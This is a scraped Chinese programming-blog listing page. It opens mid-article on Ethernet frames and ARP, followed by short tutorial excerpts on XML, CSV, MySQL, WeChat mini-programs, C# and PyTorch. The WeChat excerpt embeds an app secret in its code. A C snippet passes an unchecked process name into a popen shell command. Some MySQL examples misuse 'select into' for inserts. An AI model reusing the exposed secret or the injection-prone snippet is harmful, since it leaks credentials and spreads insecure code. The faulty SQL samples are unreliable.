前导码(Preamble)：也称报头，用于使收发节点的时钟同步。物理层使用连续7个字节的0x55实现数据的同步。帧起始定界符(SFD，Start Frame Delimiter)：用于区分前导码与数据段，固定为1字节的0xD5。字段和帧起始定界符在MAC收到数据包后会自动过滤掉。目的MAC地址：即接收端物理MAC地址，由48位数字组成，占用6个字节，每个设备都有且仅有唯一的MAC地址。MAC地址从应用上可分为单播地址、组播地址和广播地址。单播地址：第一个字节的最低位为0，比如0-00-00-11-11-11，一般用于标志唯一的设备；组播地址：第一个字节的最低位为1，比如01-00-00-11-11-11，一般用于标志同属一组的多个设备；广播地址：所有48bit全为1，即FF-FF-FF-FF-FF-FF，用于标志同一网段中的所有设备。源MAC地址：即发送端物理MAC地址，占用6个字节。数据包类型/长度：2字节，当这两个字节的值小于1536 (十六进制为0x0600)时代表该以太网中数据段的长度；如果这两个字节的值大于1536，则表示与以太网帧相关的MAC客户端协议的类型，例如0x0800代表IP协议(网际协议)、0x0806 代表ARP协议(地址解析协议) 等。数据：数据段是MAC包的核心内容，它包含的数据来自MAC的上层，长度为46-1500字节。最大值1500称为以太网的最大传输单元(MTU，Maximum Transmission Unit)。接收到的数据包如果少于64字节会被认为发生冲突，数据包被自动丢弃。校验(FCS，Frame Check Sequence)：确保数据的正确传输，在数据的尾部加入了4字节的循环冗余校验码(CRC)来检验数据是否传输错误。CRC数据校验从目的MAC地址开始。帧间隙(IFG，Interpacket Gap)：以太网相邻两帧之间的时间间隔，即网络设备和组件在接收一帧之后，需要短暂的时间来恢复并为接收下一帧做准备的时间，最小值是96 bit time(媒介中发送96位原始数据所需要的时间)。 四、ARP协议 在以太网中要想进行通信，首先要知道接收端的物理MAC地址，而ARP(Address Resolution Protocol),地址解析协议就是根据目的设备的IP地址 (逻辑地址)获取MAC地址的一种TCP/IP协议。
ARP协议分为ARP请求和ARP应答，源主机发起查询目的MAC地址的报文称为ARP请求，目的主机响应源主机并发送包含本地MAC地址的报文称为ARP应答。
当主机需要找出网络中的另一个主机的物理地址时，它就可以发送一个ARP请求报文，这个报文包含了发送方的MAC地址和IP 地址以及接收方的IP地址。因为发送方不知道接收方的物理地址，所以这个查询分组会在网络层中进行广播，即ARP请求时发送的接收方物理地址为广播地址，用48'hff_ff_ff_ff_ff_ff表示。此时局域网中的所有主机都会进行接收并处理这个ARP请求报文，然后进行验证，查看接收方的IP地址是不是自己的地址。是则返回ARP应答报文(含接收方的IP地址和物理地址)，不是则不响应。
主机B利用收到的ARP请求报文中的请求方物理地址，以单播的方式直接发送给主机A，主机A将收到的ARP应答报文中的目的MAC地址解析出来，将目的MAC地址和目的 P 地址更新至ARP缓存表中。当再次和主机A通信时，可以直接从ARP缓存表中获取，而不用重新发起ARP请求报文。ARP缓存表中的表项有过期时间(一般为20分钟)，过期之后，需要重新发起ARP请求以获取目的MAC地址。
ARP数据位于以太网帧格式的数据段中。28字节的ARP数据位于以太网格式的数据段。由于以太网数据段最少为46个字节，而ARP数据包总长度为28个字节，因此在ARP数据段后面需要填充18字节的数据，以满足以太网传输格式的要求，填充的数据可以为任意值，但一般为0。
硬件类型(Hardware type)：硬件地址的类型，1 表示以太网地址。协议类型(Protocol type)：要映射的协议地址类型，ARP协议的上层协议为IP协议，因此该协议类型为IP协议，其值为0x0800。硬件地址长度 (Hardware size)：硬件地址(MAC 地址)的长度，以字节为单位。对于以太网上 IP 地址的ARP请求或者应答来说，该值为6。协议地址长度 (Protocol size)：IP地址的长度，以字节为单位。对于以太网上 P 地址的 ARP 请求或者应答来说，该值为4。OP(Opcode)：操作码，用于表示该数据包为ARP请求或者ARP应答。1表示ARP请求，2表示ARP应答。源MAC地址：发送端的硬件地址。源IP地址：发送端的协议(IP) 地址，如192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f63dacf65625efd98703d2b39c5673ff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6070a1726fdd7d60bb01a83dc7289c29/" rel="bookmark">
			修改接口jmx文件，查看`xml.etree.ElementTree.Element`类型的数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要查看xml.etree.ElementTree.Element类型的数据，您可以使用xml.etree.ElementTree模块中的方法。以下是一些常用的方法：
使用tag属性查看元素的标签名： print(element.tag) 使用attrib属性查看元素的属性： print(element.attrib) 使用text属性查看元素的文本内容： print(element.text) 使用iter()方法遍历元素的子元素： for child in element.iter(): print(child.tag, child.attrib, child.text) 使用find()方法查找子元素： child_element = element.find('child_tag') 使用findall()方法查找所有匹配的子元素： child_elements = element.findall('child_tag') 这些方法可以帮助您查看和处理xml.etree.ElementTree.Element类型的数据。如果您需要更多帮助，请提供更多关于您的问题的详细信息。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/799e19bb38aa71c09827b4b02a3f4c8a/" rel="bookmark">
			Android颜色透明度(不透明度)对应的十六进制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		颜色值（#AARRGGBB）透明度百分比和十六进制对应关系
下面是透明度，再加上平常写得颜色值就表示该颜色值多少透明度了
一、一张表格，基本都概括，方便查找和使用
透明度 十六进制
100% FF
99% FC
98% FA
97% F7
96% F5
95% F2
94% F0
93% ED
92% EB
91% E8
90% E6
89% E3
88% E0
87% DE
86% DB
85% D9
84% D6
83% D4
82% D1
81% CF
80% CC
79% C9
78% C7
77% C4
76% C2
75% BF
74% BD
73% BA
72% B8
71% B5
70% B3
69% B0
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/799e19bb38aa71c09827b4b02a3f4c8a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf66cd2f5edf829c25b958884a92c7fa/" rel="bookmark">
			Python中导入csv数据文件的全面指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python中的csv模块是一种用于读取和写入csv文件的模块，csv可以用于将数据从文件或者其他来源导入到Python中进行分析和处理。在这篇文章中，我们将全面介绍Python中如何导入csv文件，并将从多个方面进行详细探讨，包括读取和写入csv文件、处理csv文件中的缺失值和特殊字符，并利用Pandas对csv文件中的数据进行批量处理。
一、读取csv文件 在Python中使用csv模块读取csv文件非常简单。导入csv模块后，使用csv.reader()函数可以直接从csv文件中读取数据。下面是一个示例代码：
import csv with open('example.csv') as csvfile: reader = csv.reader(csvfile, delimiter=',') for row in reader: print(row) 上述代码中，我们首先导入csv模块。然后，使用with open()函数读取csv文件，创建一个csv reader对象，该对象将按照逗号分隔符读取csv文件中的每一行，并打印每行数据。
二、写入csv文件 与读取csv文件相似，使用csv模块向csv文件中写入数据也非常简单。下面是一个示例代码：
import csv with open('example.csv', 'w', newline='') as csvfile: writer = csv.writer(csvfile) writer.writerow(['name', 'age', 'gender']) writer.writerow(['Alice', '20', 'Female']) writer.writerow(['Bob', '25', 'Male']) 上述代码中，我们使用with open()函数创建一个csv writer对象，并使用writerow()函数将数据逐行写入到csv文件中。其中，newline=''参数可以防止在csv文件中出现不必要的空行。
三、处理csv文件中的缺失值和特殊字符 当读取csv文件时，我们有时会遇到一些缺失值或者特殊字符。为了防止出现数据错误，我们需要对这些问题进行处理。
1、处理缺失值：
在csv文件中，缺失值通常用NaN或者空格表示。在Python中，我们可以使用Pandas库的read_csv()函数读取csv文件，并使用dropna()函数删除含有缺失值的行：
import pandas as pd df = pd.read_csv('example.csv') df.dropna(inplace=True) 2、处理特殊字符：
在csv文件中，有些特殊字符可能会打乱数据结构，影响后续的数据处理和分析。在Python中，我们可以使用csv模块的quotechar和quoting参数来处理特殊字符。
import csv with open('example.csv', 'r') as csvfile: reader = csv.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bf66cd2f5edf829c25b958884a92c7fa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a6fec8c3d85886c7da474463c591b02/" rel="bookmark">
			el-table 表格结合Sortable.js快速实现拖拽
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		// 通过 npm安装
npm install sortablejs --save
//导入
import Sortable from 'sortablejs'
实例：
// 行拖拽 const rowDrop = () =&gt; { const tbody = document.querySelector('.el-table__body-wrapper tbody') const _this = state Sortable.create(tbody, { onEnd({ newIndex, oldIndex }) { if (newIndex == oldIndex) return _this.tableData.splice(newIndex, 0, _this.tableData.splice(oldIndex, 1)[0]) var newArray = _this.tableData.slice(0) _this.tableData = [] ctx.root.$nextTick(() =&gt; { _this.tableData = newArray }) }, }) } 再mounted的时候调用一下该方法，快速实现行拖拽
组件文档:Sortable.js中文网|配置
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76d97dc4f908f34b9d27986c318c3654/" rel="bookmark">
			微信小程序后端学习笔记——Openid获取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通过自己的服务器获取openid需要用到wx.login接口，并且需要自己编写一个api
具体逻辑如下：
1、通过wx.login接口获取微信用户的code
2、在服务器中编写接口，通过获取的code与微信服务器交换用户的openid
3、将获取的openid传递给微信小程序并保存到缓存中
一、小程序端，通过wx.login接口获取微信用户的code，并接受服务器传递过来的openid进行缓存 wx.login({ success: (res) =&gt; { const{ code }= res; //将获取到的code传递给api接口，并从api接口获取openid wx.request({ url: 'http://localhost:3000/getOpenid', data:{ code, }, success(res){ const { openid } = res.data; //将获取到的openid进行缓存 wx.setStorageSync('openid', openid) } }) }, 二、服务器端编写相关API接口，通过前端传递过来的code交换openid //获取openid app.get('/getOpenid',async(req,res)=&gt;{ const { code } = req.query; request({ //通过code向微信服务器交换openid url:`https://api.weixin.qq.com/sns/jscode2session?appid=wx91542af25d5792fb&amp;secret=57a6f1132a1090d5492bc2387d129498&amp;js_code=${code}&amp;grant_type=authorization_code` },(err,response,data)=&gt;{ // 将获取的openid传递给微信小程序 res.send(data) }) }) 注意：要调用request指令的话要下载request插件：
下载代码：
npm install request --save 下载完成后通过require进行引入：
const request = require('request');
这里涉及到wx.login的相关使用，具体可以看微信官方的文档：
wx.login使用文档：wx.login(Object object) | 微信开放文档
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/76d97dc4f908f34b9d27986c318c3654/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/636316545895a49cc1482b6ec70e615a/" rel="bookmark">
			oracle不小心将表update修改了如何回滚
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		oracle提供了一种闪回的方法，可以将某个时间的数据给还原回来
SELECT * FROM T_DIS_EVENT_RELATION_TYPE AS OF TIMESTAMP TO_TIMESTAMP ( '2023-08-08 15:31:00', 'yyyy-mm-dd hh24:mi:ss' ); T_DIS_EVENT_RELATION_TYPE 是误操作，需要闪回的表
2023-08-08 15:31:00这个时间点是误操作的那个时间点，是个大概的时间，不用精确，在这个时间之前就是之前正确的数据，之后就是误操作后的数据
ALTER TABLE T_DIS_EVENT_RELATION_TYPE ENABLE ROW MOVEMENT; 闪回操作前启用行移动功能
T_DIS_EVENT_RELATION_TYPE 是误操作，需要闪回的表
FLASHBACK TABLE T_DIS_EVENT_RELATION_TYPE TO TIMESTAMP TO_TIMESTAMP ( '2023-08-08 15:31:00', 'yyyy-mm-dd hh24:mi:ss' ); T_DIS_EVENT_RELATION_TYPE 是误操作，需要闪回的表，2023-08-08 15:31:00时间点与步骤1的时间点相同。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b710558617cd3a891302b88e407ae52/" rel="bookmark">
			“尚硅谷”Mysql数据库TCL(事务)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		TCL事务控制语言 事务 一个或一组sql语句组成一个执行单元，这个执行单元要么全部执行，要么全部不执行。
事务的ACID特性 1、原子性：指事务是一个不可分割的工作单位，事务中的操作要么都发生，要么都不发生。
2、一致性：事务必须使数据库从一个一致性状态变换到另外一个一致性状态。
3、隔离性：指一个事务的执行不能被其他事务干扰，即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能互相干扰。
4、持久性：指一个事务一旦被提交，它对数据库中数据的改变就是永久性的，接下来的其他操作和数据故障不应该对其有任何影响。
事务的创建 隐式事务：事务没有明显的开启和结束的标记。比如insert、update、delete与语句。
显式事务：事务具有明显的开启和结束的标记。前提：必须先设置自动提交功能为禁用。
show variables like 'autocommit';#on set autocommit=0;#关闭自动提交事务 show variables like 'autocommit';#off #步骤1：开启事务 set autocommit=0; start transaction;#可选的 #步骤2：编写事务中的sql语句(select update delete) 语句1; 语句2; ... #步骤3：结束事务 commit;#提交事务 rollback;#回滚事务 savepoint 节点名;#设置保存点 /* zhangsan：1000 lisi：1000 zhangsan给lisi转账500 */ set autocommit=0; start transaction; update account set balance=500 where username='zhangsan'; update account set balance=1500 where username='lisi'; commit; #savepoint的使用 set autocommit=0; start transaction; delete from account where id=25; savepoint a;#设置保存点 delete from account where id=28; rollback to a;#回滚到保存点 事务的并发处理 类似于java当中的线程安全问题
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0b710558617cd3a891302b88e407ae52/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db61f253ed071f0978a91d011cdeaf2d/" rel="bookmark">
			“尚硅谷”Mysql数据库DDL补充
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据类型 原则：所选择的类型越简单越好，能保存数值的类型越小越好，节省空间。
数值型 整型 特点
1、如果不设置无符号还是有符号，默认是有符号，如果(ˇ?ˇ) 想设置无符号我，需要添加unsigned关键字。
2、如果插入的数值超出了整型的范围，会报out of range异常，并且插入的是临界值。
3、如果不设置长度，会默认的长度 ，长度代表显示的最大宽度，如果不够会用0在左填充，但必须搭配zerofill使用。
create table tab_int( t1 int ZEROFILL,#0填充 t2 int unsigned #设置为无符号，则t2不能添加负数。 ); 小数 定点数 dec(M,D)
decimal(M,D)
浮点数 float(M,D)
double(M,D)
特点：
1、M：整数部位+小数部位,D：小叔部位
2、MD都可以省略，如果是decimal，则M默认为10，D默认为0.如果是float和double，则会根据插入的数值的精度来决定精度。
3、定点型的精确度较高，如果要求插入数值的精度较高如货币运算等考虑使用。
create table tab( f1 float, f2 double(5,2), f3 decimal ) 字符型 较短的文本：char、varchar
特点：
char(M)：固定字符长度,耗空间，效率高。
varchar(M)：可变字符长度，节省空间，效率较低。
#enum枚举，例子中只能插入a或者b create table tab_char( ca1 enum('a','b') ); #set可在abc中插入多个 create table tab_set( s1 set('a','b','c') ); insert into tab_set values('a,c,d)'; 较长的文本：text、blob(较长的二进制数据)
日期型 create table tab_date( t1 datetime, t2 timestamp	); insert into tab_date values(now(),now()); show variables like 'time_zone';#显示时区 set time_zone='+9:00';#更改时区 常见约束 含义： 一种限制，用于限制表中的数据，为了保证表中数据的准确和可靠性。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/db61f253ed071f0978a91d011cdeaf2d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/464678ac6de12044b04b8dba12c93e58/" rel="bookmark">
			“尚硅谷”Mysql数据库DML、DDL
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DML数据操作语言： 插入：insert
修改：update
删除：delete
一、插入语句 语法一：insert into 表名(列名，…) value(值1，…) ; 特点：
1、插入的值的类型要与列的类型一致或兼容。
select into emp(empno,ename,deptno,photo,job_id) value(11,'张三',10,null,2); 2、可以为null的列如何插入值。
#这里photo字段可以为空 #方式一： select into emp(empno,ename,deptno,photo,job_id) value(11,'张三',10,null,2); #方式二： select into emp(empno,ename,deptno,job_id) value(11,'张三',10,2); 3、列的顺序可以调整，但是数值必须一一对应。 4、列的个数和值的个数必须一致。
5、可以省略列名，插入的数据必须按照列的顺序。
6、支持插入多行。
select into emp(empno,ename,deptno,job_id) value(11,'张三',10,2) value(12,'李四',10,4) value(13,'王武',10,3); 7、支持子查询
insert into emp2 select * from emp; 语法二：insert into 表名 set 列名=值，列名=值，… 不支持多行插入，不支持子查询
insert into beaty set id=19,name='lisi',phone='222'; 二、修改语句 修改单表的记录 语法：
update 表名 set 列=新值,列=新值,…
where 筛选条件;
update beaty set phone = '132456',id = '123' where name like 't%'; 修改多表的记录 语法：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/464678ac6de12044b04b8dba12c93e58/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c89268e8524da2798d9632c19a0d94a/" rel="bookmark">
			微信小程序设置 tabbar icon 大小
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		微信小程序的 tabbar icon 大小可以通过以下方式进行设置：
将 tabbar icon 图片制作成合适的尺寸：你可以使用设计工具（如 Photoshop、Sketch 等）将图标调整为合适的大小。通常建议使用 48x48 或 60x60 像素的图标。
在 app.json 文件中设置 tabbar 图标大小：在 app.json 文件的 tabBar 字段中设置 iconSize 属性，可以控制 tabbar 图标的大小。例如：
"tabBar": { "list": [ { "pagePath": "pages/home/home", "text": "首页", "iconPath": "images/home.png", "selectedIconPath": "images/home_selected.png", "iconSize": 48 }, { "pagePath": "pages/profile/profile", "text": "个人", "iconPath": "images/profile.png", "selectedIconPath": "images/profile_selected.png", "iconSize": 48 } ] } 在上面的示例中，iconSize 属性被设置为 48，这将使 tabbar 图标的大小为 48x48 像素。
微信小程序规定 tabbar icon 的尺寸不能超过 81x81 像素，否则可能会被自动缩放或裁剪。因此，建议根据实际需求和设计准则选择合适的图标大小，并进行适当的调整。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2c89268e8524da2798d9632c19a0d94a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15abb518dd27d219435a99d8e0d8ee16/" rel="bookmark">
			linux 判断一个程序是否在运行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 BOOL IsProcessExist(const char* processName) { char command[150]; FILE *fp; char buf[3]; int count = 0; if(sprintf(command, "ps | grep %s | wc -l", processName) &lt; 0) return -1; if((fp = popen(command,"r")) != NULL) { if((fgets(buf,3,fp)) != NULL) { printf("%s,buf=%s\n", __FUNCTION__,buf); count = atoi(buf); if(count &gt; 2) { pclose(fp); return TRUE; } } pclose(fp); } return FALSE; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38580d9b97385a5379bd26230df07f85/" rel="bookmark">
			按键精灵批量修改延时为随机延时
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		按键精灵批量修改延时为随机延时 前言代码 前言 批量将按键精灵脚本中的固定延迟加浮动值改为随机延时
代码 // 延迟随机上限 例如延迟1000毫秒 随机延迟为1000 ~ 1000*mult // ------------------------------------------------------------------------------------------------- mult = 1.2 Randomize Function random(lower, upper) random = Int((upper - lower + 1) * Rnd + lower) End Function Function DelayM(value) DelayM = random(value, value * mult) Delay DelayM //	TracePrint DelayM End Function 加入这段
然后将脚本中的Delay 全文替换为 DelayM
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c5b5b7d42e32ba48dc02f8212b2fb06/" rel="bookmark">
			北京西二旗和上海张江程序员的终极悲惨宿命
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前几天看到一篇文章，叫《北京西二旗和上海张江程序员的终极悲惨命运》，特别有意思，角度很新奇。
据说这篇文章是支付宝前程序员写的，谈了自己对西二旗和张江等码农聚集区房价和程序员的宿命的看法。
声明一点，这篇文章的观点不一定正确或者你不同意，但是，思考的角度值得一看。
看完这篇文章之后，我说一下我的想法。
这篇文章让我想起了《富爸爸穷爸爸》那本书，在书中作者谈了一个观点叫：资产是能把钱放进我口袋里的东西。负债是把钱从我口袋里取走的东西。
所以，在作者罗伯特清琦看来：房产，车子，应该都属于负债，而不属于资产。
因为当你买了房子之后，是背负了一身债务，每个月需要把钱从你口袋里掏走，去送给银行的。
对于大多数普通人来讲，买房并不是投资，这跟有钱人买房的投资逻辑是不一样的。
大多数普通人买房也没有能力买到绝对升值的好地段的房子。
就像是在 17 年，18 年左右，互联网上流行一个趋势，都在炒作说：杭州是程序员最宜居，对程序员最好的城市。那里有大公司，且房价便宜，可是现在回过头来看，那几年移居杭州买房的程序员，应该都赔了，房价下降的不是一星半点。
《软技能 2》的作者约翰・森梅兹说：真正获得财务成功的唯一方法就是用钱生钱。如果想获得财务自由，你就必须要能够让你的钱为你所用。如果说收益给我们自由，那么后面一定要再加上一句 — 一债务会给我们套上枷锁。
我想强调的是后面这一句：如果说收益给我们自由，那么后面一定要再加上一句 — 一债务会给我们套上枷锁。
大多数人买房，都是背负债务的，即使房子升值了，好像都跑不赢银行的高利率。
何况，当大环境不好的时候，还真没有什么好的钱生钱的方式。
看看你现在投资房地产敢吗？这两年房地产烂尾，房价下跌，行情太差了；再看看创业投资呢？更不行啊，天天裁员，业务打不开，各种实体行业和创业公司倒闭；再看看股市，更是惨不忍睹，已经跌妈不认了。
所以，有时候，就是时也，运也，命也。
对于普通人来讲，并不是搞什么投资房产和股票，而是想办法好好挣钱，好好存钱。
点击下方公众号卡片，关注我
在公众号对话框，回复关键字 “1024”
免费领取副业赚钱实操教程
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2020e33ee26c2a1c0e853623d33d32f2/" rel="bookmark">
			【电机绘图】:插补算法（一）—直线插补—逐点比较法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今日介绍学习一种使用电机作画、绘图、加工零件时需要使用的算法 ： 插补算法
本文提供直线插补的概念基础，基本思路分析，C语言实现等，代码会直接贴出！
插补算法是指在数值计算或数据处理中，根据已有的数据点或采样点，推断出未知数据点或采样点的值的方法。
插补算法可以通过已知数据点之间的关系来填补数据间的空缺或缺失值，从而恢复完整的数据。
在图像处理、信号处理、曲线拟合等领域中，插补算法被广泛应用。
常见的插补算法有线性插值、最邻近插值、多项式插值和样条插值等。插补算法可以帮助我们填补数据缺失的部分，从而更好地分析和处理数据。
目录
概念引入--优化的拟合直线:
直线插补—逐点比较法公式：
进给情况一：在第一象限的进给与插补
进给情况二：在第二象限的进给与插补
逐点比较法的总结：
直线插补—逐点比较法 的C实现：
效果展示：
代码给出：
结束语：
概念引入--优化的拟合直线: 如图：这有一条直线需要我们进行弥合绘制，它的起点是原点（0,0），终点目标是A（6,4） 我们很容易想到：
因为它的俩个端点固定，因此在数学计算关系式上，我们对其进行补足时，只需计算其斜率：
k=（4-0）/ (6-0) = 2/3 ;然后将这个运算关系带入电机控制移动，X走一格时，Y同时走2/3，
直到到达点A即可~~
但现实却不会这样：
如果我们的机械电机设计精度远大于这个需求长度分度要求，我们可以尝试使用这个求斜率的办法去弥合绘制该曲线，但实际与理论相悖，
在微观层面，计算机与加工电机或者加工刀具是无法做到如此精准的绘制与定位的，在加工的时候，不同的产品有各式各样的形状。计算机对其直线上每个点的定位，在微观上总是不准确的：
简单的形状，可以轻松的实现。如位置点，只需要确定xy位置，电机运动到xy点上，就能够加工成功。
但是对于比较复杂的形状，此时如果我们去考虑它所有的运行轨迹，所有的运动位置点，这样会非常复杂，计算机的工作量也会大大的增加。
因此在实际应用中，对于复杂的形状，我们无法精确地确定每个点的位置，而是通过数据密化，尽可能的去拟合它真实的形状，通过这种方式，不仅能在达到精度要求的前提下，还能够大大减小计算机的工作量，这就是“插补”。
下图即是对插补的理解画法：
其中我们需要抽离三个概念：
1.理论直线轨迹（肉眼轨迹） ——粉色直线
2.实际运行轨迹（机械轨迹） ——棕色折线
3.实际给进点情况（X、Y机械运行步骤）——红色箭头
（向上向下是给Y，向做向右是进给X）
我们从此图可以看出，这种对于不是45度角度斜率的直线的弥合，我们并不是每次只需，X进1，Y进1就可了，而是有某些部分是需要多进给的，就比如此图，它就在（3,2）后又在此多进给了X一次，以达到对于2/3这个斜率的更佳弥合~~
直线插补—逐点比较法公式： 以下公式是指源于旧的基础上进行运算得出新的F值：
F = F - |Ye| (F&gt;=0)
F = F + |Xe| (F &lt; 0 )
进给情况一：在第一象限的进给与插补 我们直接看到之前的题目：它在第一象限，看看如何理解使用这个公式：
F&gt;=0 表示只能在X坐标上进给
F&lt;0 表示只能在Y坐标上进给
首先我们需要初始化一些数据，它们的值与运算关系如下：
F=0；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2020e33ee26c2a1c0e853623d33d32f2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7991acc237fd068a979e7352d3c51cb/" rel="bookmark">
			串口调试助手XCOM和UartAssist安装与使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、XCOM V2.6 串口调试助手1.下载2.安装3.使用在这里插入图片描述 二、UartAssist V4.3.29 串口调试助手1.下载2.安装3.使用 总结 前言 串口助手是一种用于测试和调试串口通信的工具。它可以通过串口与外部设备进行通信，并提供了界面来监视和控制串口数据的发送和接收。
串口通信调试：串口助手可以帮助你验证串口通信是否正常工作。你可以使用串口助手打开串口并发送指令或数据给外部设备，然后观察外部设备的回应，以验证通信是否成功、数据是否正确交互。如果出现问题，你可以通过串口助手查看发送和接收的数据，帮助发现并排除故障。
数据监测：串口助手可以实时显示串口接收到的数据，方便你监测外部设备发送的数据。你可以通过串口助手查看数据的内容、格式和频率，以确保通信过程中的数据流是符合要求的。
数据发送：串口助手允许你向外部设备发送自定义的指令或数据。你可以在串口助手界面输入要发送的数据，并通过串口发送给外部设备。这对于测试设备响应、配置设备参数等操作非常有用。
数据记录：有些串口助手还提供了数据记录的功能，可以将串口通信的数据保存到文件中。这在长时间测试或需要分析历史数据时非常有用。
一、XCOM V2.6 串口调试助手 1.下载 XCOM V2.6 串口下载
链接：https://pan.baidu.com/s/1hMkNY_zq0nqxfFnH4VRbDQ
提取码：5bzm
2.安装 3.使用 二、UartAssist V4.3.29 串口调试助手 1.下载 下载链接：https://www.szrfstar.com/download/UartAssist-cn.html
2.安装 安装之后好像回自动提示版本更新。
3.使用 总结 提供了两个常用的串口调试工具，希望能帮到大家。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c67597b77657315cfcbe1491d5f8707/" rel="bookmark">
			C#声明一个带返回值的委托
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、声明
public delegate string TestDel(string str);
2、使用
TestDel t;
t = (string str) =&gt; str;
t += (string str) =&gt; str + "1";
t += (string str) =&gt; str + "2";
t += (string str) =&gt; str + "3";
Console.WriteLine(t ("hhhh"));
3，总结
（这里添加监听使用了表达式Lambda，参考C#语法_匿名方法与Lambda表达式）
这里会打印hhhh3，也就是最后一个监听的返回值。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e22b2315ca07009a8bccf664da6d458a/" rel="bookmark">
			PyTorch Lightning教程七：可视化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本节指导如何利用Lightning进行可视化和监控模型
为何需要跟踪参数 在模型开发中，我们跟踪感兴趣的值，例如validation_loss，以可视化模型的学习过程。模型开发就像驾驶一辆没有窗户的汽车，图表和日志提供了窗口，让我们知道该把车开到哪里。有了Lightning，几乎可以可视化任何你能想到的东西：数值、文本、图像、音频…
跟踪指标 度量可视化是理解模型在整个模型开发过程中如何运行的最基本但最强大的方法。要跟踪指标，只需使用LightningModule中的self.log方法
class LitModel(pl.LightningModule): def training_step(self, batch, batch_idx): value = ... self.log("some_value", value) 要一次记录多个指标，使用self.log_dict
values = {"loss": loss, "acc": acc, "metric_n": metric_n} # add more items if needed self.log_dict(values) 要在命令行进度条中查看指标，需将prog_bar参数设置为True。
self.log(..., prog_bar=True) 命令行视图 如果要在浏览器中查看指标，默认情况下，Lightning使用Tensorboard和一个简单的CSV日志记录器。
# 默认情况下，每个训练器已经启用了tensorboard(如果依赖项可用) trainer = Trainer() 使用如下命令进行显示
tensorboard --logdir=lightning_logs/ 如果您使用的是notebook环境，如colab或kaggle或jupyter，使用如下命令启动Tensorboard
%reload_ext tensorboard %tensorboard --logdir=lightning_logs/ 累计指标 当在training_step中调用self.log时，它会生成一个时间序列，显示指标随时间的变化情况。
然而，对于验证和测试集，我们通常对绘制每批数据的指标不感兴趣。相反，我们希望在整个数据分割中计算汇总统计(例如平均值、最小值或最大值)。
当您在validation_step和test_step中调用self.log时，Lightning会自动累积指标并在整个分割(epoch)完成后取平均值。
def validation_step(self, batch, batch_idx): value = batch_idx + 1 self.log("average_value", value) 如果不想取平均值，也可以通过传递reduce_fx参数从{min,max,sum}中进行选择。
# default function self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e22b2315ca07009a8bccf664da6d458a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
